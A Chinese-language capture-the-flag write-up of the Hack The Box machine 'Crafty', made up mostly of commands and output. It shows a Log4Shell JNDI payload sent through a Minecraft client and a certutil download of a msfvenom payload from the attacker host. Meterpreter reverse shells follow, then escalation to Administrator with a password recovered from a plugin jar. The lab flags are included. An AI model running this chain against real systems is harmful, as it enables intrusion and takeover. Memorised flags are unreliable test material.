# Crafty

:::info

Difficulty: Easy

Operating System: Windows

:::

## nmap 信息搜集

```plaintext title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.249"
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
```

## 基于 Minecraft 进行 Log4j 攻击

### 连接服务器

使用 [ammaraskar/pyCraft - Github](https://github.com/ammaraskar/pyCraft) 与服务器进行连接

```bash
┌──(env)(randark ㉿ kali)-[~/tools/pyCraft]
└─$ python3 start.py
Enter your username: user123
Enter your password (leave blank for offline mode):
Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249
Connecting in offline mode...
Connected.
```

### 构建 Log4j 攻击载荷

使用 [kozmer/log4j-shell-poc - Github](https://github.com/kozmer/log4j-shell-poc)

```bash
┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
└─$ python3 poc.py --userip 10.10.16.3 --webport 80 --lport 9999

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.16.3:1389/a}

[+] Starting Webserver on port 80 http://0.0.0.0:80
Listening on 0.0.0.0:1389
```

### 发送 Log4j 载荷

```bash
┌──(env)(randark ㉿ kali)-[~/tools/pyCraft]
└─$ python3 start.py
Enter your username: user123
Enter your password (leave blank for offline mode):
Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249
Connecting in offline mode...
Connected.
${jndi:ldap://10.10.16.3:1389/a}
```

在 Log4j 载荷服务器中得到

```bash
Send LDAP reference result for a redirecting to http://10.10.16.3:80/Exploit.class
10.10.11.249 - - [27/Mar/2024 17:09:58] "GET /Exploit.class HTTP/1.1" 200 -
```

在监听器中得到

```bash
┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
└─$ rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.249] 49681
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server> whoami
whoami
crafty\svc_minecraft
```

## User - crafty\svc_minecraft

### flag - user

```bash
PS C:\users\svc_minecraft\Desktop> type user.txt
type user.txt
e706dc2e565ff1fa962c61ed39c083a9
```

### 反弹至 Metasploit

生成载荷

```bash
┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=8888 -f exe -o exp-8888.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: exp-8888.exe
```

开启 http 投递载荷

```bash
python3 -m http.server 80
```

下载载荷

```bash
PS C:\users\svc_minecraft\Desktop> certutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe
certutil -urlcache -f http://10.10.16.3/exp-8888.exe exp-8888.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

启动监听器

```bash
┌──(randark ㉿ kali)-[~/tools/log4j-shell-poc]
└─$ msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.16.3
lhost => 10.10.16.3
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:8888
```

执行载荷

```bash
PS C:\users\svc_minecraft\Desktop> .\exp-8888.exe
.\exp-8888.exe
```

收到回连的 shell

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:8888
[*] Sending stage (201798 bytes) to 10.10.11.249
[*] Meterpreter session 1 opened (10.10.16.3:8888 -> 10.10.11.249:49687) at 2024-03-27 17:48:29 +0800

meterpreter > sysinfo
Computer        : CRAFTY
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

## Minecraft 插件探测

在 Minecraft 插件目录中发现

```bash
meterpreter > pwd
C:\users\svc_minecraft\server\plugins
meterpreter > ls
Listing: C:\users\svc_minecraft\server\plugins
==============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  9996  fil   2023-10-28 05:48:53 +0800  playercounter-1.0-SNAPSHOT.jar
```

将这个文件下载下来

```bash
meterpreter > download playercounter-1.0-SNAPSHOT.jar
[*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar
[*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar
[*] Completed  : playercounter-1.0-SNAPSHOT.jar -> /home/randark/tools/log4j-shell-poc/playercounter-1.0-SNAPSHOT.jar
```

### 插件逆向分析

使用 Jadx 进行分析
![img](img/image_20240356-175646.png)

在其中发现一个密码

```bash
s67u84zKq8IXw
```

### 提权至 administrator

生成一个新的 meterpreter 载荷

```bash
┌──(randark ㉿ kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=7777 -f exe -o exp-7777.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: exp-7777.exe
```

借助 [antonioCoco/RunasCs - Github](https://github.com/antonioCoco/RunasCs) 这个项目

上传文件

```bash
meterpreter > pwd
C:\users\svc_minecraft\Desktop
meterpreter > upload /home/randark/exp-7777.exe
[*] Uploading  : /home/randark/exp-7777.exe -> exp-7777.exe
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/randark/exp-7777.exe -> exp-7777.exe
[*] Completed  : /home/randark/exp-7777.exe -> exp-7777.exe
meterpreter > upload /home/randark/tools/RunasCs/RunasCs.exe
[*] Uploading  : /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe
[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe
[*] Completed  : /home/randark/tools/RunasCs/RunasCs.exe -> RunasCs.exe
```

启动监听器

```bash
┌──(randark ㉿ kali)-[~]
└─$ msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.16.3
lhost => 10.10.16.3
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:7777
```

以 administrator 执行载荷

```bash
C:\users\svc_minecraft\Desktop>.\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe
.\RunasCs.exe administrator s67u84zKq8IXw exp-7777.exe

No output received from the process.
```

收到回连

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:7777
[*] Sending stage (201798 bytes) to 10.10.11.249
[*] Meterpreter session 1 opened (10.10.16.3:7777 -> 10.10.11.249:49688) at 2024-03-27 18:11:33 +0800

meterpreter > sysinfo
Computer        : CRAFTY
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: CRAFTY\Administrator
```

## User - Administrator

### flag - root

```bash
meterpreter > pwd
C:\users\administrator\desktop
meterpreter > cat root.txt
f51313ca3887cf040c75041795c610c6
```
